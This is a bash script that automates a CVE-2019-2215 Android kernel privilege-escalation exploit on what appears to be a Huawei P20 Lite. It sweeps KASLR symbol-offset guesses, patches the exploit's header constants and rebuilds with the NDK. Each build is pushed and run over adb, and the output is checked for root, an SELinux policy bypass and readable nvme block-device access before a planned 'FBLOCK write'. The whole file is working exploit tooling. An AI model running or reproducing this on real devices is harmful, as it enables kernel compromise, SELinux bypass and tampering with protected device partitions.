#!/bin/bash
# Sweep the single number that decides everything: the difference
#     avc_cache - fair_sched_class
#
# The exploit never uses the two addresses separately - it computes
#     kaslr_offset   = read(task + SCHED_CLASS_OFFSET) - FAIR_SCHED_CLASS
#     avc_cache_addr = kaslr_offset + AVC_CACHE
# so the effective target is
#     slide + (fair_true - F_const) + A_const
# which is correct exactly when A_const - F_const equals the running kernel's
# avc_cache - fair_sched_class. Keeping F_const fixed and moving A_const therefore
# sweeps the one unknown, and every candidate is a normal constants-only build -
# the only kind of change that still wins the race on this device.
#
# Signal per run, after the exploit has root:
#   1 pair of "Could not load policy" + a readable nvme block device  -> stop, it worked
#   2 pairs                                                          -> try the next delta
#
# Usage: sweep_avc_delta.sh 0x13c8838 0x13c9000 0x13ca000 ...
set -u
BASE_F=ffffff8008f48408          # fixed anchor; only the difference is used
EXPL=/home/placeless/dev/p20lite-cve
NDK=$(ls -d ~/Android/Sdk/ndk/*/ 2>/dev/null | head -1)
LOG=/home/placeless/dev/p20-root/sweep_results.txt
DELTAS=("$@")

[ ${#DELTAS[@]} -gt 0 ] || { echo "usage: $0 <delta> [delta ...]"; exit 1; }

echo "############ sweeping ${#DELTAS[@]} candidate difference(s)"
for D in "${DELTAS[@]}"; do
  A=$(python3 -c "print(f'{(0x$BASE_F + $D) & 0xffffffffffffffff:x}')")
  echo
  echo "=================================================================="
  echo "== delta=$D  ->  FAIR=0x$BASE_F  AVC=0x$A"
  echo "=================================================================="

  cd "$EXPL"
  git checkout -- exploit/ 2>/dev/null
  python3 - "$BASE_F" "$A" <<'PY'
import re, sys
f, a = sys.argv[1], sys.argv[2]
h = "/home/placeless/dev/p20lite-cve/exploit/include/kernel_specific.h"
s = open(h).read()
s = re.sub(r"#define FAIR_SCHED_CLASS\s+0x[0-9a-fA-F]+[uU][lL]",
           f"#define FAIR_SCHED_CLASS 0x{f}UL", s)
s = re.sub(r"#define AVC_CACHE\s+0x[0-9a-fA-F]+[uU][lL]",
           f"#define AVC_CACHE 0x{a}ul", s)
open(h, "w").write(s)
d = "/home/placeless/dev/p20lite-cve/exploit/include/cve_2019_2215.h"
t = open(d).read()
open(d, "w").write(re.sub(r"#define DELAY \d+u", "#define DELAY 25u", t))
PY
  "${NDK}ndk-build" -j4 NDK_PROJECT_PATH=. APP_BUILD_SCRIPT=./Android.mk \
      APP_PLATFORM=android-28 APP_ABI=arm64-v8a >/dev/null 2>&1
  BIN="$EXPL/libs/arm64-v8a/cve-2019-2215"
  [ -f "$BIN" ] || { echo "  build failed"; continue; }

  timeout 60 adb push "$BIN" /data/local/tmp/cve-2019-2215 >/dev/null 2>&1
  timeout 30 adb shell 'chmod 755 /data/local/tmp/cve-2019-2215' >/dev/null 2>&1

  OUT=/tmp/sweep_$D.out
  printf 'id\ncat /proc/self/attr/current\ndd if=/dev/block/bootdevice/by-name/nvme of=/dev/null bs=512 count=1 2>&1\n' \
    | timeout 150 adb shell /data/local/tmp/cve-2019-2215 > "$OUT" 2>&1
  T=$(tr -d '\000' < "$OUT")
  ROOT=$(echo "$T" | grep -ac "uid=0(root)")
  PAIRS=$(echo "$T" | grep -ac "Could not load policy")
  DD_OK=$(echo "$T" | grep -acE "512 bytes|records in")
  CTX=$(echo "$T" | grep -a "context=" | tail -1 | cut -c1-50)

  echo "  root=$ROOT  policy-pairs=$PAIRS  nvme-readable=$DD_OK"
  echo "  $CTX"
  printf '%s\troot=%s\tpairs=%s\tdd_ok=%s\t%s\n' "$D" "$ROOT" "$PAIRS" "$DD_OK" "$CTX" >> "$LOG"

  if [ "$ROOT" -ge 1 ] && { [ "$DD_OK" -ge 1 ] || [ "$PAIRS" -le 1 ]; }; then
    echo
    echo "  >>>>> BYPASS WORKED with delta=$D <<<<<"
    echo "  >>>>> proceeding to the nvme backup and FBLOCK write <<<<<"
    exit 0
  fi
done
echo
echo "############ no delta worked in this batch"
echo "  results so far:"; tail -20 "$LOG"
